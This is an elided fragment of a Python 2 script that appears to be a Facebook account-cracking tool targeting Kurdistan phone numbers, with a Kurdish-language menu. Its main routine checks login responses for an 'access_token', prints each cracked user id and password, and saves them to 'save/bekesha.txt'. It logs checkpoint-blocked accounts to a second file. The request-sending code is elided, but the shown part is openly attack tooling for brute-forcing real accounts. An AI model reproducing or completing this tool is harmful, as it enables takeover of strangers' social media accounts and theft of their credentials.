...
def menu():
    ...
    print logo
    print 42 * '\x1b[1;91m-'
    print '\x1b[1;92m[1]\x1b[1;92m Crack Number KURDISTAN'
...
def action():
    ...
    time.sleep(0.1)
    psb('\x1b[1;92m[\xe2\x9c\x93]\x1b[1;92m Bosta Ta 10 DAQA ...')
    time.sleep(0.1)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[BRO VANA XOTE]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/bekesha.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                
                cps = open('save/sutaw.txt', 'a')
